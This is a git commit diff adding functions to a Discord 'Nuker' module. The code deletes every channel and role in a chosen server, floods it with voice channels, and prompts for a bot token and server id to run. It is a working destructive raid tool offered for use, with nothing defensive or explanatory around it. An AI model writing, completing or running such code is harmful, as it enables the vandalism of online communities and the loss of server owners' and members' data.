73a893e81fc1c57e2c1aae3cae038d0a8ee125a9
Niju <87604950+ItsNiju@users.noreply.github.com>
2021-12-20 18:11:47 +0530

    die

--- Modules/Nuker.py
+++ Modules/Nuker.py
@@ -59,3 +59,34 @@ async def delete_all_roles(guild):
     return deleted
 
 
+async def create_voice_channels(guild, name):
+    created = 0
+    for _ in range(200 - len(guild.channels)):
+        try:
+            await guild.create_voice_channel(name=name)
+            created += 1
+        except:
+            continue
+    return created
+
+async def nuke(guild):
+    print(f'{red}Nuke: {pink}{guild.name}')
+    deleted_channels = await delete_all_channel(guild)
+    print(f'{pink}Delete Channels:{pink}{deleted_channels}')
+    delete_roles = await delete_all_roles(guild)
+    print(f'{pink}Delete Roles:{pink}{delete_roles}')
+    created_channels = await create_voice_channels(guild,name)
+    print(f'{pink}Create Voice Channels:{pink}{created_channels}')
+    print(f'{pink}--------------------------------------------\n\n')
+
+
+while True:
+    token = input(f'{pink}Input bot token:{pink}')
+    name = input(f'{pink}Input name for created channels / roles:{pink}')
+    client = commands.Bot(command_prefix='$',intents=discord.Intents.all())
+    guild_id =  input(f'{whit}Input server id:{lred}')
+    @client.event
+    async def on_ready():
+        for guild in client.guilds:
+         if str(guild.id) == guild_id:
+          await nuke(guild)
